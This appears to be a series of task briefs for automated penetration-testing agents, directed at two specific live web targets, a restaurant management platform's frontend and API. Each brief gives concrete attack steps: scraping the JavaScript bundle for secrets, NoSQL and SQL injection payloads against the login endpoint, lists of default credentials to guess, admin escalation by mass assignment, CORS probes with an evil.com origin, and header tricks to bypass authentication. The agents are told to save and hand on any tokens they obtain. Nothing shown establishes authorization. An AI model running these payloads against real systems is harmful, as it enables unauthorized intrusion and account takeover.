3c61d136.task:
Perform comprehensive reconnaissance and attack surface mapping on TWO related targets that are likely a frontend+backend pair of the same application:

- Frontend: https://icsa-web.vercel.app
- Backend/API: https://icsa.onrender.com

Your goals:
1. Fingerprint both targets: tech stack, frameworks, server headers, cookies, security headers (CSP, HSTS, X-Frame-Options, etc.)
2. Crawl the frontend with katana to enumerate all pages, links, API calls made by the JS, and forms
3. Fuzz both for hidden directories/endpoints using ffuf with a solid wordlist (e.g. /api, /admin, /graphql, /swagger, /docs, /health, /metrics, /v1, /v2, common REST paths)
4. Check the frontend JS bundles for hardcoded API keys, secrets, internal endpoints, or auth logic
5. Use arjun to discover hidden HTTP parameters on discovered endpoints
6. Extract all API endpoints discovered in the JS source (look for fetch/axios calls, environment vars, etc.)
7. Map all authentication-related endpoints (login, register, password reset, token refresh, OAuth)
8. Check robots.txt, sitemap.xml, .well-known/ paths on both
9. Test CORS configuration on the API: what origins are allowed?
10. Note all cookies (flags: Secure, HttpOnly, SameSite), JWT structure if any tokens are issued
11. Check for open API docs: /swagger.json, /openapi.json, /api/docs, /api-docs, /graphql (introspection)
12. Use nuclei with basic/info/low templates to catch quick wins (exposed panels, default creds, misconfigurations)

Document EVERYTHING in notes with category=wiki so other agents can build on your map. Include: all discovered endpoints/paths, API base URL, auth flow, tech stack, parameter names, any tokens/cookies observed, CORS policy, and security header status.

Be thorough — this map drives all downstream vulnerability testing.

107c58e6.task:
Analyze the ICSA frontend application's JavaScript bundle and source to discover hidden API endpoints, hardcoded secrets, authentication logic, and security misconfigurations.

**Target:**
- Frontend: https://icsa-web.vercel.app
- JS bundle: https://icsa-web.vercel.app/assets/index-mMXkScxP.js (290KB bundle)
- Backend API: https://icsa.onrender.com

**Your tasks:**

1. Download the JS bundle:
   ```
   curl -s "https://icsa-web.vercel.app/assets/index-mMXkScxP.js" -o /tmp/icsa-bundle.js
   ```

2. Beautify/format it for analysis:
   ```
   js-beautify /tmp/icsa-bundle.js -o /tmp/icsa-bundle-pretty.js
   ```

3. Extract ALL API endpoint strings - search for:
   - `/api/` patterns
   - `fetch(`, `axios.`, `.get(`, `.post(`, `.put(`, `.delete(`, `.patch(` calls
   - Environment variable references like `VITE_`, `REACT_APP_`
   - Base URLs, API keys, tokens

4. Search for hardcoded credentials, API keys, secrets:
   ```bash
   grep -E "(api[_-]?key|secret|token|password|credential|auth|bearer)" /tmp/icsa-bundle-pretty.js -i | head -100
   ```

5. Find ALL route definitions to map the full application:
   - React Router routes, Next.js routes, etc.
   - User roles and permissions defined in frontend code

6. Check for source maps: https://icsa-web.vercel.app/assets/index-mMXkScxP.js.map

7. Look for any OAuth/OIDC configuration, auth server URLs

8. Search for any restaurant IDs, user IDs, or other object identifiers hardcoded in the bundle

9. Check for any admin-only routes exposed in the frontend

10. Extract the full list of API endpoints used by the app. For each endpoint, note:
    - HTTP method
    - Path
    - Parameters/body schema

**Document all findings as notes with category=wiki tagged ["js-bundle", "endpoints", "icsa"]**

Report back with: full list of discovered API endpoints, any secrets/keys found, user roles defined, and any interesting routes or functionality.

54c50543.task:
Perform comprehensive authentication and injection testing on the ICSA restaurant management platform.

**Targets:**
- API: https://icsa.onrender.com
- Login: POST /api/v1/auth/login (JSON: {"email":"...","password":"..."})

**IMPORTANT - Rate Limiting:** The login endpoint has a rate limit of 10 requests per 15 minutes. Be conservative with requests; focus on precision over volume.

**Phase 1: Discover additional auth endpoints**
Test these paths (GET/POST):
- /api/v1/auth/register
- /api/v1/auth/signup
- /api/v1/auth/forgot-password
- /api/v1/auth/reset-password
- /api/v1/auth/refresh
- /api/v1/auth/me
- /api/v1/auth/logout
- /api/v1/auth/verify
- /api/v1/users/register

**Phase 2: NoSQL/SQL Injection on login**
Test the login endpoint with injection payloads:
```python
import requests

base = "https://icsa.onrender.com"

# NoSQLi payloads for email field
nosql_payloads = [
    {"email": {"$gt": ""}, "password": "anything"},
    {"email": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
    {"email": {"$regex": ".*"}, "password": {"$ne": "x"}},
    {"email": "admin@icsa.com' OR '1'='1", "password": "x"},
    {"email": "admin'--", "password": "x"},
]
# Test each, look for non-401 responses or different error messages
```

**Phase 3: Default credentials**
Try these common credentials (be careful with rate limits - space them out):
- admin@icsa.com / admin
- admin@icsa.com / password  
- admin@icsa.com / admin123
- demo@icsa.com / demo
- test@icsa.com / test
- admin@admin.com / admin
- manager@icsa.com / manager
- owner@restaurant.com / password

**Phase 4: Registration analysis**
If a registration endpoint exists:
- Try creating a user with admin role via mass assignment: {"email":"...", "password":"...", "role":"admin"}
- Check if email verification is required
- Test for account enumeration via registration (does "email already exists" differ?)

**Phase 5: Password reset flow**
If forgot-password exists:
- Test with valid/invalid emails to check for enumeration
- Test token predictability if reset links are sent

**Phase 6: Check CORS**
Test if the CORS `access-control-allow-origin` can be bypassed:
```bash
curl -I -H "Origin: https://evil.com" https://icsa.onrender.com/api/v1/auth/login -X OPTIONS
curl -I -H "Origin: https://icsa-web.vercel.app.evil.com" https://icsa.onrender.com/health
curl -I -H "Origin: null" https://icsa.onrender.com/health
```

**Phase 7: HTTP method tampering**
Try non-standard methods on auth endpoints.

**Write all findings as notes with category=findings or methodology. If you get valid credentials or a token, document them immediately as a HIGH PRIORITY note.**

If you successfully authenticate, save the token and report it back via agent_finish so the IDOR/access control agent can use it.

e798af0c.task:
Test the ICSA platform's public and unauthenticated endpoints for IDOR, injection vulnerabilities, and authorization bypass.

**Targets:**
- API: https://icsa.onrender.com
- Frontend: https://icsa-web.vercel.app

**Phase 1: Enumerate the public menu endpoint**

The endpoint `/api/v1/public/menu` is a PUBLIC endpoint that doesn't require auth. Test with various parameters:

```python
import requests

base = "https://icsa.onrender.com"

# Test common parameter names for restaurant ID
params_to_try = [
    "restaurantId", "restaurant_id", "id", "restaurant", 
    "slug", "name", "code", "token", "key",
    "tenantId", "tenant_id", "org", "orgId",
]

for param in params_to_try:
    for val in ["1", "2", "test", "a"]:
        r = requests.get(f"{base}/api/v1/public/menu", params={param: val})
        if r.status_code != 404:
            print(f"HIT: {param}={val} -> {r.status_code} {r.text[:200]}")
```

**Phase 2: Find public restaurant endpoints**
Try these public-style paths:
- /api/v1/public/restaurants
- /api/v1/public/restaurants/{id}
- /api/v1/public/menu/{id}
- /api/v1/public/menu?id=1
- /api/v1/restaurants
- /api/v1/menu

**Phase 3: Check CORS misconfigurations**
```bash
# Test various origins
for origin in "https://evil.com" "null" "https://icsa-web.vercel.app.evil.com" "https://icsaweb.vercel.app" "https://icsa-web.vercel.app"; do
    echo "--- Origin: $origin ---"
    curl -si "https://icsa.onrender.com/health" -H "Origin: $origin" | grep -i "access-control"
done
```

**Phase 4: Health/status endpoint info disclosure**
```bash
curl -s https://icsa.onrender.com/health | python3 -m json.tool
curl -s https://icsa.onrender.com/readyz | python3 -m json.tool
```
Look for version numbers, database info, environment details.

**Phase 5: Unauthenticated endpoint fuzzing with ffuf**
Fuzz for hidden public/unauthenticated paths:
```bash
ffuf -u "https://icsa.onrender.com/api/v1/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,201,301,302,400 \
  -t 10 -rate 20 \
  -o /tmp/ffuf-api-fuzz.json
```

Also try:
```bash
ffuf -u "https://icsa.onrender.com/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,201,400 \
  -t 10 -rate 20
```

**Phase 6: Look for unauthenticated access to supposedly protected endpoints**
Test if any protected routes work WITHOUT auth by:
- Removing the Authorization header
- Setting it to empty string
- Sending `Authorization: Bearer null`
- Sending `Authorization: Bearer undefined`
- Using `X-Original-URL`, `X-Rewrite-URL` headers to bypass path-based auth

```bash
# Method override tricks
curl -s https://icsa.onrender.com/api/v1/app/dashboard -H "X-HTTP-Method-Override: GET"
curl -s https://icsa.onrender.com/api/v1/app/orders -H "X-Original-URL: /api/v1/public/menu"
```

**Phase 7: Test backup endpoint specifically**
The `/api/v1/app/dashboard/backup` endpoint is very interesting. Test:
```bash
curl -sv https://icsa.onrender.com/api/v1/app/dashboard/backup \
  -H "Authorization: Bearer " \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1"
```

**Document all findings as notes. If any endpoint returns data without authentication, file a vulnerability report immediately using create_vulnerability_report.**
